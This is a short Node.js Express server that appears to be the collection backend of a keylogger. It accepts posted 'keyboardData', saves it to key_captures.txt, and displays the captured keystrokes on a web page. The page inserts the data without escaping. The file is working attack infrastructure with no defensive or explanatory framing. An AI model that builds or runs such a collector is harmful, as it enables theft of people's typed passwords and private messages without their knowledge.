const fs = require("fs");
const express = require("express");
const bodyParser = require("body-parser");

const app = express();

app.use(bodyParser.json({ extended: true }));

const port = 8080;

app.get("/", (req, res) => {
	try {
		const kl_file = fs.readFileSync("./key_captures.txt", { encoding: 'utf8', flag: 'r' });
		res.send(`<h1 style="color: #3366cc;">Captures</h1><p style="color: #009900;">${kl_file.replace("\n", "<br>")}</p>`);
	} catch {
		res.send("<h1 style='color: #cc0000;'>Still Capturing......</h1>");
	}
});

app.post("/", (req, res) => {
	console.log(req.body.keyboardData);
	fs.writeFileSync("key_captures.txt", req.body.keyboardData);
    	res.send("Successfully set the data");
});

app.listen(port, () => {
	console.log(`[+] Server is listening on port ${port}...`);
});
